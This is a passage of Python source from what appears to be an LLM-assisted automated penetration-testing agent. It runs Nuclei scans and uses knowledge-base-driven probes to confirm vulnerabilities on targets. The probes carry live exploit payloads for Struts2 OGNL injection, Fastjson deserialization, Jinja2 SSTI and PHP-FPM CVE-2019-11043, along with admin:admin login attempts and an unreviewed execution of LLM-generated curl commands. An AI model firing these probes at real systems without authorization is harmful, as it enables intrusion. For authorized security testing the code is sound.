            ports_json=json.dumps(ports_info, ensure_ascii=False),
            fingerprints_json=json.dumps(fp_summary, ensure_ascii=False, indent=2),
            web_paths_json=json.dumps(web_paths[:30], ensure_ascii=False),
            path_contents_json=json.dumps(path_content_summary, ensure_ascii=False),
        )
        from backend.agents.prompt_utils import wrap_prompt_with_block
        prompt = wrap_prompt_with_block(prompt, self._operator_block)

        try:
            import uuid as _uuid
            stream_id = f"llm-strategy-{_uuid.uuid4().hex[:8]}"

            async def _on_strategy_delta(delta: str):
                if self._decision_callback:
                    await self._decision_callback({
                        "action": "llm_delta",
                        "phase": "vuln_scan",
                        "delta": delta,
                        "stream_id": stream_id,
                        "kind": "reasoning",
                    })

            result, reasoning = await self.llm.chat_with_stream_callback(
                prompt,
                on_reasoning_delta=_on_strategy_delta,
                response_format="json",
            )
            strategy = json.loads(result)
            if "error" in strategy or not strategy.get("nuclei_tags"):
                raise ValueError(f"LLM 返回无效策略: {strategy.get('error', 'empty tags')}")
            return {
                "nuclei_tags": strategy.get("nuclei_tags", []),
                "analysis": strategy.get("analysis", ""),
                "high_value_targets": strategy.get("high_value_targets", []),
                "reasoning": reasoning,
            }
        except Exception as e:
            logger.warning(f"[VulnAgent] LLM 扫描策略失败，根据指纹生成回退策略: {e}")
            # 从指纹自动生成标签
            fallback_tags = set()
            for port, fp in fingerprints.items():
                summary = fp.get("summary", "").lower()
                tag_map = {"thinkphp": ["thinkphp", "php"], "fastjson": ["fastjson", "java"], "tomcat": ["tomcat"], "spring": ["spring", "java"], "shiro": ["shiro", "java"], "weblogic": ["weblogic", "java"], "wordpress": ["wordpress"], "jenkins": ["jenkins"], "jboss": ["jboss", "java"], "struts": ["struts", "java"], "laravel": ["laravel", "php"], "django": ["django", "python"], "flask": ["flask", "python"], "nacos": ["nacos"], }
                for kw, tags in tag_map.items():
                    if kw in summary:
                        fallback_tags.update(tags)
            return {"nuclei_tags": list(fallback_tags)[:8], "analysis": f"LLM 不可用，根据指纹自动回退: {list(fallback_tags)}", }

    # ================================================================
    # Phase 3: Nuclei 扫描
    # ================================================================

    @staticmethod
    def _target_scan_profile(host: str) -> dict:
        """Return scan parameters tuned for target network location."""
        import ipaddress
        try:
            is_private = ipaddress.ip_address(host).is_private
        except ValueError:
            is_private = False
        if is_private:
            return {
                "nuclei_timeout": "10", "nuclei_retries": "1",
                "nuclei_concurrency": "25", "nuclei_rate_limit": "150",
                "nmap_os_detect": True,
            }
        return {
            "nuclei_timeout": "20", "nuclei_retries": "2",
            "nuclei_concurrency": "10", "nuclei_rate_limit": "80",
            "nmap_os_detect": False,
        }

    async def _nuclei_broad_scan(self, web_url: str, target: str) -> dict:
        """基础扫描：CVE + 漏洞 + 配置错误"""
        sp = self._target_scan_profile(target)
        result: ExecuteResult = await self.executor.run(
            tool="nuclei",
            args=[
                "-u", web_url,
                "-t", "http/cves/",
                "-t", "http/vulnerabilities/",
                "-t", "http/misconfiguration/",
                "-severity", "critical,high,medium",
                "-etags", "default-login",
                "-jsonl",
                "-silent",
                "-rate-limit", sp["nuclei_rate_limit"],
                "-timeout", sp["nuclei_timeout"],
                "-retries", sp["nuclei_retries"],
                "-c", sp["nuclei_concurrency"],
            ],
            timeout=600,
        )

        findings: list[VulnFinding] = []
        if result.success and result.stdout:
            findings = self.nuclei_parser.parse(result.stdout, target)

        return {"findings": findings, "raw_nuclei": result.stdout}

    async def _nuclei_tag_scan(self, web_url: str, target: str, tags: list[str]) -> dict:
        """LLM 推荐标签的专项扫描"""
        if not tags:
            return {"findings": []}

        tag_str = ",".join(tags[:8])
        logger.info(f"[VulnAgent] LLM 推荐标签扫描: {tag_str} @ {web_url}")

        sp = self._target_scan_profile(target)
        result: ExecuteResult = await self.executor.run(
            tool="nuclei",
            args=[
                "-u", web_url,
                "-tags", tag_str,
                "-etags", "default-login",
                "-jsonl",
                "-silent",
                "-timeout", sp["nuclei_timeout"],
                "-retries", sp["nuclei_retries"],
                "-c", sp["nuclei_concurrency"],
            ],
            timeout=600,
        )

        findings: list[VulnFinding] = []
        if result.success and result.stdout:
            findings = self.nuclei_parser.parse(result.stdout, target)

        return {"findings": findings}

    async def _nuclei_path_scan(self, web_url: str, target: str, paths: list[str]) -> dict:
        """对 Gobuster 发现的路径做深入扫描"""
        if not paths:
            return {"findings": []}

        urls = []
        for path in paths[:20]:
            url = f"{web_url}{path}" if path.startswith("/") else f"{web_url}/{path}"
            urls.append(url)

        url_list = "\n".join(urls)
        logger.info(f"[VulnAgent] 路径深扫: {len(urls)} 条路径 @ {web_url}")

        sp = self._target_scan_profile(target)
        result: ExecuteResult = await self.executor.run(
            tool="nuclei",
            args=[
                "-l", "/dev/stdin",
                "-t", "http/cves/",
                "-t", "http/vulnerabilities/",
                "-t", "http/misconfiguration/",
                "-t", "http/exposures/",
                "-severity", "critical,high,medium",
                "-etags", "default-login",
                "-jsonl",
                "-silent",
                "-timeout", sp["nuclei_timeout"],
                "-retries", sp["nuclei_retries"],
                "-c", sp["nuclei_concurrency"],
            ],
            input_data=url_list,
            timeout=600,
        )

        findings: list[VulnFinding] = []
        if result.success and result.stdout:
            findings = self.nuclei_parser.parse(result.stdout, target)

        return {"findings": findings}

    # ================================================================
    # Phase 3.5: 知识库驱动精准检测
    # ================================================================

    async def _kb_driven_detection(
        self,
        target: str,
        target_os: str,
        ports: list[PortInfo],
        fingerprints: dict[int, dict],
        web_paths: list[str],
        existing_findings: list[VulnFinding],
    ) -> list[VulnFinding]:
        """
        用知识库里的检测方法精准验证漏洞。

        流程：
          1. 收集所有信号（指纹关键词、端口、JSON探测结果、服务名）
          2. 多维度查知识库
          3. 对每个匹配的KB条目，执行其 detection_method / verification_command
          4. 确认存在的漏洞标记 exploitable=True
        """
        if self.kb.size == 0:
            logger.info("[VulnAgent] 知识库为空，跳过 KB 检测")
            return []

        # ── 收集搜索信号 ──────────────────────────────
        search_signals = set()
        all_fp_text = ""

        for port, fp in fingerprints.items():
            summary = fp.get("summary", "")
            for tech in summary.split(", "):
                tech = tech.strip()
                if tech and tech != "unknown":
                    search_signals.add(tech)

            # JSON 探测结果也是重要信号
            json_probe = fp.get("json_probe", "")
            if json_probe:
                search_signals.add("json")
                if "FASTJSON" in json_probe.upper():
                    search_signals.add("fastjson")
                if "JACKSON" in json_probe.upper():
                    search_signals.add("jackson")
                if "SPRING" in json_probe.upper():
                    search_signals.add("spring")
                # 关键：即使没有明确检测到 fastjson 字样，
                # 只要是 Java + JSON endpoint，也应该尝试 fastjson 检测
                if "JSON_ENDPOINT" in json_probe:
                    search_signals.add("fastjson")
                    search_signals.add("java")

            all_fp_text += f" {summary} {json_probe} "

            # 从 whatweb/httpx 原始输出提取更多信号
            whatweb = fp.get("whatweb", "").lower()
            httpx_out = fp.get("httpx", "").lower()
            nmap_ver = fp.get("nmap_version", "").lower()
            nmap_banner = fp.get("nmap_banner", "").lower()
            combined_fp = f"{whatweb} {httpx_out} {nmap_ver} {nmap_banner} {summary}".lower()

            # 直接关键词提取
            fp_keywords = {
                "tomcat": ["tomcat"], "struts": ["struts"], "jboss": ["jboss"],
                "weblogic": ["weblogic"], "shiro": ["shiro", "rememberme", "deleteme"],
                "activemq": ["activemq"], "flask": ["flask", "werkzeug"],
                "django": ["django"], "thinkphp": ["thinkphp"],
                "geoserver": ["geoserver"], "wordpress": ["wordpress", "wp-"],
                "jenkins": ["jenkins"], "spring": ["spring", "springframework"],
                "fastjson": ["fastjson", "alibaba"], "php": ["php/"],
                "php-fpm": ["php-fpm", "php/fpm"],
                "nginx": ["nginx"], "apache": ["apache"],
                "gunicorn": ["gunicorn"], "jinja2": ["jinja2"],
                "jetty": ["jetty"],
            }
            for signal_name, keywords in fp_keywords.items():
                for kw in keywords:
                    if kw in combined_fp:
                        search_signals.add(signal_name)
                        break

        # 从端口服务名提取信号
        for p in ports:
            svc = f"{p.service} {p.version} {p.banner}".lower()
            for kw in ["tomcat", "struts", "jboss", "weblogic", "shiro",
                        "activemq", "flask", "django", "thinkphp", "geoserver",
                        "wordpress", "jenkins", "nginx", "php", "java",
                        "gunicorn", "werkzeug", "python", "apache"]:
                if kw in svc:
                    search_signals.add(kw)

        # ── 端口推理规则 ─────────────────────────────
        # 某些端口高概率对应特定服务，即使指纹未明确识别
        open_ports = {p.port for p in ports}
        port_inference = {
            8080: ["tomcat", "java"],           # Tomcat 默认端口
            8009: ["tomcat", "java"],           # Tomcat AJP
            8443: ["tomcat", "java"],           # Tomcat HTTPS
            7001: ["weblogic", "java"],         # WebLogic
            7002: ["weblogic", "java"],         # WebLogic
            8161: ["activemq", "jolokia"],      # ActiveMQ Console
            61616: ["activemq"],                # ActiveMQ OpenWire
            9090: ["jenkins"],                  # Jenkins
            8888: ["java"],                     # 常见 Java Web 端口
        }
        for port_num, inferred_signals in port_inference.items():
            if port_num in open_ports:
                for sig in inferred_signals:
                    if sig not in search_signals:
                        search_signals.add(sig)
                        logger.debug(f"[VulnAgent] 端口推理: :{port_num} → {sig}")

        # 同时检查 nmap 的 service 字段中 "http-proxy" / "ajp13" 等
        for p in ports:
            if p.service in ("ajp13", "ajp"):
                search_signals.add("tomcat")
                search_signals.add("java")
            if "coyote" in f"{p.version} {p.banner}".lower():
                search_signals.add("tomcat")
                search_signals.add("java")

        # ── Web 框架推理规则 ─────────────────────────
        # 根据已有信号推断可能的框架和漏洞类型
        inference_rules = {
            # Python Web 服务器 → 可能是 Flask/Django，搜索 SSTI
            ("python",):     ["flask", "django", "ssti"],
            ("gunicorn",):   ["flask", "django", "ssti", "python"],
            ("werkzeug",):   ["flask", "ssti", "python"],
            ("wsgiserver",): ["flask", "django", "ssti", "python"],
            # Java 服务器 → 搜索常见 Java 漏洞（struts 需独立指纹确认）
            ("java",):       ["fastjson", "shiro", "spring"],
            ("tomcat",):     ["tomcat", "java", "shiro"],
            ("jboss",):      ["jboss", "java", "jmxinvoker"],
            ("weblogic",):   ["weblogic", "java", "t3"],
            # PHP → ThinkPHP 等 + PHP-FPM（Nginx+PHP 组合是 CVE-2019-11043 的前提）
            ("php",):        ["thinkphp", "wordpress", "php-fpm"],
            # Shiro 相关
            ("rememberme",): ["shiro"],
            ("deleteme",):   ["shiro"],
        }

        # ── 组合推理规则（需要多个信号同时存在）──────────
        # 先放到下面，在 signals_to_add 初始化之后执行

        signals_to_add = set()
        for trigger_signals, inferred in inference_rules.items():
            if any(s.lower() in {x.lower() for x in search_signals} for s in trigger_signals):
                signals_to_add.update(inferred)

        # 组合推理（多信号同时存在才触发）
        signals_lower = {s.lower() for s in search_signals}
        # Nginx + PHP → 强烈暗示 PHP-FPM 配置，CVE-2019-11043
        if "nginx" in signals_lower and "php" in signals_lower:
            signals_to_add.update(["php-fpm", "fastcgi", "cve-2019-11043"])
        # ActiveMQ 端口信号补充
        if "activemq" in signals_lower:
            signals_to_add.update(["jolokia", "cve-2022-41678"])

        search_signals.update(signals_to_add)

        # 已发现的漏洞名也是信号
        existing_names = {f.name.lower() for f in existing_findings}
        existing_cves = {f.cve.lower() for f in existing_findings if f.cve}

        # 从已发现的漏洞中提取额外信号
        for name in existing_names:
            for kw in ["shiro", "flask", "django", "fastjson", "struts",
                        "tomcat", "ssti", "spring", "jboss", "weblogic"]:
                if kw in name:
                    search_signals.add(kw)

        logger.info(f"[VulnAgent] KB 搜索信号: {search_signals}")

        # ── 多维度搜索知识库 ──────────────────────────
        matched_entries: dict[str, ExploitEntry] = {}
        for signal in search_signals:
            results = self.kb.search(vuln_name=signal, fingerprint=signal)
            for entry in results:
                if entry.vuln_id not in matched_entries:
                    matched_entries[entry.vuln_id] = entry

        # ── 过滤方法论 / 泛化条目（不是具体漏洞）────────
        matched_entries = {
            vid: e for vid, e in matched_entries.items()
            if (e.category or "").lower() not in ("web_enum", "methodology")
            and not vid.startswith("generic_")
        }

        if not matched_entries:
            logger.info("[VulnAgent] KB 未匹配到任何条目")
            return []

        # ── 技术栈层级过滤 ────────────────────────────────
        # 当检测到应用框架时，跳过容器/服务器级的"弱口令""配置错误"类 KB 条目
        # 避免 Struts2 应用被匹配到 "Tomcat弱口令" KB 条目
        all_app_frameworks = set()
        for port, fp in fingerprints.items():
            for tech in fp.get("app_frameworks", []):
                all_app_frameworks.add(tech.lower())

        if all_app_frameworks:
            infra_keywords = {"弱口令", "weak password", "default login",
                              "default credential", "manager deploy"}
            filtered_entries: dict[str, ExploitEntry] = {}
            for vid, entry in matched_entries.items():
                desc_lower = entry.description.lower()
                category_lower = entry.category.lower() if entry.category else ""

                # 检查是否是容器/服务器级的弱口令/配置类条目
                is_infra_vuln = False
                for kw in infra_keywords:
                    if kw in desc_lower or kw in category_lower:
                        is_infra_vuln = True
                        break

                if is_infra_vuln:
                    # 检查该 KB 条目的技术（如 tomcat）是否只是容器
                    entry_tech = entry.category.lower() if entry.category else ""
                    if any(infra in entry_tech for infra in ["tomcat", "nginx", "apache", "iis"]):
                        # 容器级弱口令条目，但有应用框架存在 → 跳过
                        logger.info(
                            f"[VulnAgent] KB 跳过基础设施条目: {vid} "
                            f"('{entry.description[:40]}')，"
                            f"因为检测到应用框架: {all_app_frameworks}"
                        )
                        continue

                filtered_entries[vid] = entry
            matched_entries = filtered_entries

        if not matched_entries:
            logger.info("[VulnAgent] KB 过滤后无匹配条目")
            return []

        logger.info(
            f"[VulnAgent] KB 匹配到 {len(matched_entries)} 个条目: "
            f"{list(matched_entries.keys())}"
        )

        if self._decision_callback:
            kb_plan = [
                f"{eid}: {e.description[:60]}" for eid, e in list(matched_entries.items())[:10]
            ]
            await self._decision_callback({
                "action": "thought",
                "phase": "vuln_scan",
                "thinking": (
                    f"知识库匹配到 {len(matched_entries)} 个条目: "
                    + ", ".join(list(matched_entries.keys())[:10])
                ),
                "purpose": "KB 驱动精准检测",
                "plan": kb_plan,
                "message": f"KB 匹配 {len(matched_entries)} 个条目，开始逐一验证",
            })

        # ── 对每个匹配条目执行检测 ────────────────────
        findings: list[VulnFinding] = []

        for entry in matched_entries.values():
            # 跳过已经发现过的
            entry_cves_lower = {c.lower() for c in entry.match_cves}
            if entry_cves_lower & existing_cves:
                logger.debug(f"[VulnAgent] KB 跳过已发现: {entry.vuln_id}")
                continue

            # 确定目标 URL
            port = entry.default_port or 80
            # 看哪个指纹端口最匹配
            for fp_port in fingerprints:
                if fp_port == entry.default_port:
                    port = fp_port
                    break
            # 如果KB默认端口不在开放端口中，用第一个web端口
            open_ports = {p.port for p in ports}
            if port not in open_ports:
                for fp_port in fingerprints:
                    port = fp_port
                    break

            scheme = "https" if port in (443, 8443) else "http"
            target_url = f"{scheme}://{target}:{port}"

            logger.info(f"[VulnAgent] KB 检测: {entry.vuln_id} @ {target_url}")

            # 执行验证命令
            verified = await self._run_kb_detection(entry, target_url, target)

            if verified:
                logger.info(f"[VulnAgent] ✅ KB 确认漏洞: {entry.description}")
                findings.append(VulnFinding(
                    name=entry.description,
                    severity="high" if not entry.requires_callback else "medium",
                    cve=entry.match_cves[0] if entry.match_cves else None,
                    target=target_url,
                    port=port,
                    description=f"[KB验证] {entry.detection_method[:200]}",
                    evidence=verified,
                    exploitable=True,
                    tool="kb-detection",
                ))
                if self._decision_callback:
                    await self._decision_callback({
                        "action": "tool_result",
                        "phase": "vuln_scan",
                        "tool": f"kb:{entry.vuln_id}",
                        "message": f"KB 确认漏洞: {entry.description[:80]}",
                        "tone": "success",
                    })
            else:
                logger.info(f"[VulnAgent] ❌ KB 未确认: {entry.vuln_id}")
                if self._decision_callback:
                    await self._decision_callback({
                        "action": "tool_result",
                        "phase": "vuln_scan",
                        "tool": f"kb:{entry.vuln_id}",
                        "message": f"KB 未确认: {entry.vuln_id}",
                        "tone": "info",
                    })

        logger.info(f"[VulnAgent] KB 驱动检测完成: {len(findings)} 个确认漏洞")
        return findings

    async def _run_kb_detection(
        self,
        entry: ExploitEntry,
        target_url: str,
        target_ip: str,
    ) -> str:
        """
        执行知识库条目中的检测命令，返回成功证据（空字符串=未确认）。

        只用 verification_command + 内置探测，不用 exploit_steps（那是利用步骤）。
        """
        success_sign = entry.verification_success_sign.lower() if entry.verification_success_sign else ""

        # 收集检测命令
        commands_to_try: list[tuple[str, str]] = []

        # 1. 用 verification_command
        if entry.verification_command:
            cmd = self._replace_target(entry.verification_command, target_url, target_ip)
            commands_to_try.append((cmd, "verification_command"))

        # 2. 根据漏洞类型生成内置检测探针（不依赖 LLM 生成的 KB 内容）
        builtin = self._builtin_detection_probes(entry, target_url)
        commands_to_try.extend(builtin)

        # 3. 都没有就让 LLM 生成
        if not commands_to_try:
            if entry.detection_method:
                return await self._run_kb_detection_via_llm(entry, target_url, target_ip)
            return ""

        # 依次尝试
        for cmd, source in commands_to_try:
            logger.info(f"[VulnAgent] KB 执行 [{source}]: {cmd[:120]}...")

            result: ExecuteResult = await self.executor.run_script(
                script_content=cmd,
                timeout=15,
            )

            stdout = result.stdout.strip()
            stderr = result.stderr.strip()
            combined = f"{stdout} {stderr}".lower()

            if not stdout and not stderr:
                continue

            # 检查成功标志
            confirmed = False

            if success_sign and success_sign in combined:
                confirmed = True
            else:
                # 通用确认标志（与具体漏洞类型无关的 RCE/漏洞证据）
                rce_signs = ["uid=", "root:", "www-data"]
                # 框架特定确认标志（只在对应探针上下文中有效）
                probe_specific_signs = {
                    "builtin_fastjson_detect": ["fastjson", "com.alibaba.fastjson", "autotype", "type not match", "@type"],
                    "builtin_fastjson_inet": ["fastjson", "com.alibaba.fastjson", "autotype"],
                    "builtin_s2045_detect": ["s2-045-ok"],
                    "builtin_s2057_detect": ["54289", "location"],
                    "builtin_s2057_showcase_detect": ["54289", "location"],
                    "builtin_shiro_detect": ["rememberme=deleteme"],
                    "builtin_ssti_detect": ["49"],
                    "builtin_django_detect": ["programmingerror", "django.db", "traceback"],
                    "builtin_thinkphp_detect": ["thinkphp_fingerprint_ok"],
                    "builtin_tomcat_put_detect": ["201", "204"],
                    "builtin_tomcat_weak_detect": ["tomcat_manager_confirmed", "ok - listed applications"],
                    "builtin_tomcat_weak_html_detect": ["tomcat_manager_html_confirmed"],
                    "builtin_php_fpm_detect": ["php_fpm_502_detected", "php_fpm_anomaly_detected"],
                    "builtin_activemq_detect": ["activemq_admin_confirmed"],
                    "builtin_jboss_detect": ["jboss_jmxinvoker_found"],
                    "builtin_weblogic_detect": ["weblogic_console_found"],
                    "builtin_django_sqli_detect": ["django_sqli_detected"],
                }

                # 通用 RCE 证据（任何探针都算确认）
                if any(sign in combined for sign in rce_signs):
                    confirmed = True

                # 探针特定标志
                if not confirmed and source in probe_specific_signs:
                    if any(sign in combined for sign in probe_specific_signs[source]):
                        confirmed = True

                # 都不匹配 → LLM 快速判断（仅 ctf_expert 模式启用，pentest_engineer 不允许 LLM 自判）
                if (
                    not confirmed
                    and result.exit_code == 0
                    and len(stdout) > 50
                    and getattr(self, "_workflow_mode", "pentest_engineer") == "ctf_expert"
                ):
                    confirmed = await self._llm_quick_verify(
                        entry.description, cmd, stdout[:2000], stderr[:500]
                    )

            if confirmed:
                evidence_lines = [
                    f"Command\n{cmd}",
                    f"Stdout\n{stdout or '(empty)'}",
                    f"Stderr\n{stderr or '(empty)'}",
                ]
                return "\n\n".join(evidence_lines)

        return ""

    @staticmethod
    def _replace_target(cmd: str, target_url: str, target_ip: str) -> str:
        """
        智能替换命令中的 {TARGET} 占位符。

        KB 中的命令格式不统一：
          - curl http://{TARGET}:8090/    → {TARGET} 替换为纯 IP（命令自带端口）
          - curl http://{TARGET}/path     → {TARGET} 替换为 IP:port（命令无端口）
          - curl {TARGET}/path            → {TARGET} 替换为完整 URL
        """
        if "{TARGET}" not in cmd:
            return cmd

        from urllib.parse import urlparse
        import re

        parsed = urlparse(target_url)
        hostname = parsed.hostname or target_ip   # 纯 IP，如 "192.168.127.129"
        host_port = parsed.netloc or target_ip     # IP:port，如 "192.168.127.129:8080"

        has_scheme = "http://{TARGET}" in cmd or "https://{TARGET}" in cmd

        if has_scheme:
            # 检查命令中 {TARGET} 后面是否紧跟 :端口号
            # 如 http://{TARGET}:8080/path → 命令自带端口，只替换纯 IP
            if re.search(r'\{TARGET\}:\d+', cmd):
                cmd = cmd.replace("{TARGET}", hostname)
            else:
                # 命令没有自带端口，替换为 IP:port
                cmd = cmd.replace("{TARGET}", host_port)
        else:
            # 命令里没有协议头，{TARGET} 替换为完整 URL
            cmd = cmd.replace("{TARGET}", target_url)

        # 兜底清理
        cmd = cmd.replace("your-ip", target_ip).replace("your_ip", target_ip)
        return cmd

    @staticmethod
    def _builtin_detection_probes(
        entry: ExploitEntry, target_url: str
    ) -> list[tuple[str, str]]:
        """
        根据漏洞类型生成内置检测探针。

        这些探针不依赖 LLM 提取质量，是确定性的检测方法。
        """
        probes: list[tuple[str, str]] = []
        keywords = " ".join(entry.match_keywords + entry.tags).lower()
        category = entry.category.lower()

        # ── Fastjson 检测 ──────────────────────────────
        if "fastjson" in keywords or "fastjson" in category:
            probes.append((
                f'curl -s -X POST {target_url} '
                f'-H "Content-Type: application/json" '
                f'''-d '{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}' '''
                f'--max-time 10',
                "builtin_fastjson_detect"
            ))
            probes.append((
                f'curl -s -X POST {target_url} '
                f'-H "Content-Type: application/json" '
                f'''-d '{{"@type":"java.net.Inet4Address","val":"127.0.0.1"}}' '''
                f'--max-time 10',
                "builtin_fastjson_inet"
            ))

        # ── Struts2 检测 ──────────────────────────────
        if "struts" in keywords or "s2-" in keywords or "ognl" in keywords:
            # S2-045: Content-Type OGNL 注入
            if "s2-045" in keywords or "s2-046" in keywords or "struts" in keywords:
                probes.append((
                    f'curl -s -I {target_url} '
                    f'''-H "Content-Type: %{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','S2-045-OK')}}.multipart/form-data" '''
                    f'--max-time 10',
                    "builtin_s2045_detect"
                ))

            # S2-057: namespace OGNL 注入（URL 路径中 ${233*233}）
            if "s2-057" in keywords or "namespace" in keywords or "11776" in keywords or "struts" in keywords:
                probes.append((
                    f'curl -s -D - -o /dev/null '
                    f'"{target_url}/%24%7B233*233%7D/actionChain1.action" '
                    f'--max-time 10',
                    "builtin_s2057_detect"
                ))
                # 也试不带 struts2-showcase 前缀的路径
                probes.append((
                    f'curl -s -D - -o /dev/null '
                    f'"{target_url}/struts2-showcase/%24%7B233*233%7D/actionChain1.action" '
                    f'--max-time 10',
                    "builtin_s2057_showcase_detect"
                ))

        # ── Shiro 检测 ──────────────────────────────
        if "shiro" in keywords:
            # 发一个带错误 rememberMe cookie 的请求，看响应头是否有 deleteMe
            probes.append((
                f'curl -s -D - -o /dev/null {target_url} '
                f'-H "Cookie: rememberMe=invalid_token" --max-time 10',
                "builtin_shiro_detect"
            ))

        # ── Flask SSTI 检测 ──────────────────────────
        if "ssti" in keywords or "flask" in keywords or "jinja2" in keywords:
            # 用 --data-urlencode 避免花括号被 shell 解释
            probes.append((
                f'curl -s -G --data-urlencode "name={{{{7*7}}}}" {target_url} --max-time 10',
                "builtin_ssti_detect"
            ))

        # ── Django 检测 ──────────────────────────────
        if "django" in keywords:
            # 触发 Django debug 页面
            probes.append((
                f'curl -s {target_url}/nonexistent_path_for_debug --max-time 10',
                "builtin_django_detect"
            ))

        # ── ThinkPHP 检测（passive: check captcha route & error page fingerprint）──
        if "thinkphp" in keywords:
            probes.append((
                f'status=$(curl -s -o /dev/null -w "%{{http_code}}" '
                f'"{target_url}/index.php?s=captcha" --max-time 8); '
                f'body=$(curl -s "{target_url}/index.php?s=xxx/xxx/xxx" --max-time 8); '
                f'echo "THINKPHP_STATUS:$status"; '
                f'echo "$body" | grep -qi "thinkphp\\|think\\\\\\\\app\\|V5\\." && echo "THINKPHP_FINGERPRINT_OK"',
                "builtin_thinkphp_detect"
            ))

        # ── Tomcat PUT 检测 ──────────────────────────
        if "tomcat" in keywords and ("put" in keywords or "12615" in keywords):
            probes.append((
                f'curl -s -X PUT {target_url}/test_put_check.txt '
                f'-d "put_test_ok" -o /dev/null -w "%{{http_code}}" --max-time 10',
                "builtin_tomcat_put_detect"
            ))

        # ── Tomcat 弱口令 检测 ────────────────────────
        # 重要: 只检测 Manager 是否存在（401），不试凭据！
        # Tomcat 8+ 有 LockOutRealm，5 次失败锁 5 分钟
        # 凭据爆破留给 ExploitAgent 的 Skill 一次性完成
        if "tomcat" in keywords and ("weak" in keywords or "弱口令" in keywords or "password" in keywords):
            probes.append((
                f'code=$(curl -s -o /dev/null -w "%{{http_code}}" '
                f'"{target_url}/manager/html" --max-time 8); '
                f'echo "MANAGER_STATUS:$code"; '
                f'if [ "$code" = "401" ] || [ "$code" = "403" ]; then '
                f'echo "TOMCAT_MANAGER_CONFIRMED"; fi',
                "builtin_tomcat_weak_detect"
            ))

        # ── PHP-FPM CVE-2019-11043 检测（增强版）──────
        # 扩展触发条件：php/nginx/fastcgi 任一信号就检测
        if ("php-fpm" in keywords or ("php" in keywords and "fpm" in keywords)
            or "11043" in keywords or "fastcgi" in keywords
            or ("php" in keywords and "nginx" in keywords)):
            probes.append((
                f'baseline=$(curl -s -o /dev/null -w "%{{http_code}}" '
                f'"{target_url}/index.php" --max-time 5 2>/dev/null); '
                f'anomaly=$(curl -s -o /dev/null -w "%{{http_code}}" '
                f'"{target_url}/index.php/%0a" --max-time 5 2>/dev/null); '
                f'long_a=$(curl -s -o /dev/null -w "%{{http_code}}" '
                f'"{target_url}/index.php/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0a" --max-time 5 2>/dev/null); '
                f'echo "BASELINE:$baseline 0A:$anomaly LONG:$long_a"; '
                f'if [ "$anomaly" = "502" ] || [ "$anomaly" = "500" ]; then echo "PHP_FPM_502_DETECTED"; '
                f'elif [ "$long_a" = "502" ] || [ "$long_a" = "500" ]; then echo "PHP_FPM_502_DETECTED"; '
                f'elif [ "$anomaly" != "$baseline" ] && [ "$anomaly" != "404" ] && [ -n "$anomaly" ]; then echo "PHP_FPM_ANOMALY_DETECTED"; fi',
                "builtin_php_fpm_detect"
            ))

        # ── ActiveMQ 默认凭据检测 ────────────────────
        if "activemq" in keywords or "jolokia" in keywords or "41678" in keywords:
            from urllib.parse import urlparse
            parsed = urlparse(target_url)
            ip = parsed.hostname or ""
            # 试当前端口
            probes.append((
                f'resp=$(curl -s -u admin:admin -D - -o /dev/null {target_url}/admin/ --max-time 10); '
                f'if echo "$resp" | grep -qi "activemq"; then echo "ACTIVEMQ_ADMIN_CONFIRMED"; fi; '
                # 也试 8161
                f'resp2=$(curl -s -u admin:admin -D - -o /dev/null "http://{ip}:8161/admin/" --max-time 10); '
                f'if echo "$resp2" | grep -qi "activemq"; then echo "ACTIVEMQ_ADMIN_CONFIRMED"; fi',
                "builtin_activemq_detect"
            ))

        # ── JBoss JMXInvokerServlet 检测 ─────────────
        if "jboss" in keywords or "7504" in keywords or "12149" in keywords:
            probes.append((
                f'for path in /invoker/JMXInvokerServlet /invoker/EJBInvokerServlet; do '
                f'code=$(curl -s -o /dev/null -w "%{{http_code}}" "{target_url}${{path}}" --max-time 10 2>/dev/null); '
                f'if [ "$code" = "200" ] || [ "$code" = "500" ]; then echo "JBOSS_JMXINVOKER_FOUND"; break; fi; '
                f'done',
                "builtin_jboss_detect"
            ))

        # ── WebLogic Console 检测 ────────────────────
        if "weblogic" in keywords or "21839" in keywords:
            probes.append((
                f'code=$(curl -s -o /dev/null -w "%{{http_code}}" '
                f'"{target_url}/console/login/LoginForm.jsp" --max-time 10 2>/dev/null); '
                f'echo "WEBLOGIC_CONSOLE_STATUS:$code"; '
                f'if [ "$code" = "200" ] || [ "$code" = "302" ]; then echo "WEBLOGIC_CONSOLE_FOUND"; fi',
                "builtin_weblogic_detect"
            ))

        # ── Django SQL 注入检测 ──────────────────────
        if "django" in keywords and ("sql" in keywords or "34265" in keywords or "trunc" in keywords):
            probes.append((
                f'resp=$(curl -s "{target_url}/?date=year%27" --max-time 10 2>/dev/null); '
                f'if echo "$resp" | grep -qi "ProgrammingError\\|django.db"; then '
                f'echo "DJANGO_SQLI_DETECTED"; fi',
                "builtin_django_sqli_detect"
            ))

        return probes

    async def _run_kb_detection_via_llm(
        self,
        entry: ExploitEntry,
        target_url: str,
        target_ip: str,
    ) -> str:
        """当KB条目没有具体命令但有detection_method描述时，让LLM生成检测命令"""
        prompt = (
            f"你是渗透测试工程师。根据以下检测方法，生成一条具体可执行的curl命令来验证漏洞是否存在。\n\n"
            f"漏洞: {entry.description}\n"
            f"检测方法: {entry.detection_method}\n"
            f"目标URL: {target_url}\n"
            f"常见端点: {', '.join(entry.common_endpoints[:5])}\n\n"
            f"只返回一条完整的curl命令，不要任何解释。"
        )
        from backend.agents.prompt_utils import wrap_prompt_with_block
        prompt = wrap_prompt_with_block(prompt, self._operator_block)
        try:
            cmd = await self.llm.chat(prompt, temperature=0.1, max_tokens=500)
            cmd = cmd.strip().strip('`').strip()
            if not cmd.startswith("curl"):
                return ""

            result: ExecuteResult = await self.executor.run_script(cmd, timeout=30)
            if result.stdout.strip():
                verified = await self._llm_quick_verify(
                    entry.description, cmd, result.stdout[:2000], result.stderr[:500]
                )
                if verified:
                    return "\n\n".join([
                        f"Command\n{cmd}",
                        f"Stdout\n{result.stdout.strip() or '(empty)'}",
                        f"Stderr\n{result.stderr.strip() or '(empty)'}",
                    ])
        except Exception as e:
            logger.warning(f"[VulnAgent] KB LLM检测失败: {e}")

        return ""

    async def _llm_quick_verify(
        self, vuln_name: str, command: str, stdout: str, stderr: str
    ) -> bool:
        """让LLM快速判断命令输出是否确认漏洞存在"""
        prompt = (
            f"判断以下命令输出是否确认漏洞 [{vuln_name}] 存在。\n\n"
            f"命令: {command[:200]}\n"
